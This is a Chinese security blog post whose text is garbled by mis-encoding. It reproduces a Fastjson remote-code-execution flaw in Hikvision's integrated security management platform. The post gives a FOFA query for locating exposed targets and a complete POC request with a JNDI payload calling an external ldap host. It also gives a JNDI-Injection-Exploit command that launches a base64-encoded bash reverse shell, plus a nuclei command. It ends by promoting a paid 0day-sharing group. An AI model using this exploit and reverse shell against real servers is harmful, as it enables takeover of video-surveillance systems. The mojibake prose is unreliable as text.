> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/y30HwEfYsMyndk1Ra1zz8w)

**0x01Â é˜…è¯»é¡»çŸ¥**

**èäº‘å®‰å…¨çš„æŠ€æœ¯æ–‡ç« ä»…ä¾›å‚è€ƒï¼Œæ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯åªä¸ºç½‘ç»œå®‰å…¨äººå‘˜å¯¹è‡ªå·±æ‰€è´Ÿè´£çš„ç½‘ç«™ã€æœåŠ¡å™¨ç­‰ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºï¼‰è¿›è¡Œæ£€æµ‹æˆ–ç»´æŠ¤å‚è€ƒï¼Œæœªç»æˆæƒè¯·å‹¿åˆ©ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯èµ„æ–™å¯¹ä»»ä½•è®¡ç®—æœºç³»ç»Ÿè¿›è¡Œå…¥ä¾µæ“ä½œã€‚åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ç›´æ¥æˆ–é—´æ¥åæœå’ŒæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ã€‚æœ¬æ–‡æ‰€æä¾›çš„å·¥å…·ä»…ç”¨äºå­¦ä¹ ï¼Œç¦æ­¢ç”¨äºå…¶ä»–ï¼ï¼ï¼**

**0x02 æ¼æ´æè¿°**

æµ·åº·å¨è§†ç»¼åˆå®‰é˜²ç®¡ç†å¹³å°, å¯ä»¥å¯¹æ¥å…¥çš„è§†é¢‘ç›‘æ§ç‚¹é›†ä¸­ç®¡ç†, å®ç°ç»Ÿä¸€éƒ¨ç½²ã€ç»Ÿä¸€é…ç½®ã€ç»Ÿä¸€ç®¡ç†å’Œç»Ÿä¸€è°ƒåº¦ã€‚æµ·åº·å¨è§†ç»¼åˆå®‰é˜²ç®¡ç†å¹³å°å­˜åœ¨ Fastjson è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨æƒé™ã€‚![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49zUn4Lx0a8kfJR5ic2TVibGKzkBseac5kqHsLTuAy2OdhIIrWmL2Prz6H2g9oLQZb769QNe4e42WrlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x03 æ¼æ´å¤ç°**

**fofaï¼šapp="HIKVISION - ç»¼åˆå®‰é˜²ç®¡ç†å¹³å°"**

1. ä½¿ç”¨ POC æ‰§è¡Œ ldap è®¿é—® dnslog å‘½ä»¤ï¼Œå¾—åˆ°å›æ˜¾

```
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host:Â {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://fofa.info/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/json
Content-Length: 200

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://6setlb.dnslog.cn","autoCommit":true},"hfe4zyyzldp":"="}
```

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1SUBogbiahlGbr6cpAokl8YIFPDvyQUmads67YzhatuUAAee4IVRDtHRTSTtuic3xzSNBcyD7V1haLA/640?wx_fmt=png)

2. ä¹Ÿå¯ä½¿ç”¨ JNDI åˆ©ç”¨å·¥å…·è¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¦‚ä¸‹

```
1.å·¥å…·ä¸‹è½½:
https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0

2.å¼€å¯rmi/jndiæœåŠ¡:
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,bashåå¼¹shellè„šæœ¬base64ç¼–ç }|{base64,-d}|{bash,-i}" -A IP
```

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1SUBogbiahlGbr6cpAokl8YIwJMYw0oq0K1g0LkaRzQESicicLZXDsiaFRO91lEyyBGk8XL2VibPngLyYg/640?wx_fmt=png)

3.nuclei éªŒè¯å·²å‘è¡¨äºçŸ¥è¯†æ˜Ÿçƒ

```
nuclei.exe -t HIKVISION_ZHAFGL_Fastjson_RCE.yaml -l subs.txt -stats
```

**ç½‘ç»œå®‰å…¨ç¥å…µåˆ©å™¨åˆ†äº«**

**ç½‘ç»œå®‰å…¨æ¼æ´ N/0day åˆ†äº«**

 **åŠ å…¥æ˜Ÿçƒè¯·æ‰«æä¸‹æ–¹äºŒç»´ç ï¼Œæ›´å¤šç²¾ï¼Œæ•¬è¯·æœŸå¾…ï¼**

ğŸ‘‡ğŸ‘‡ğŸ‘‡

![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)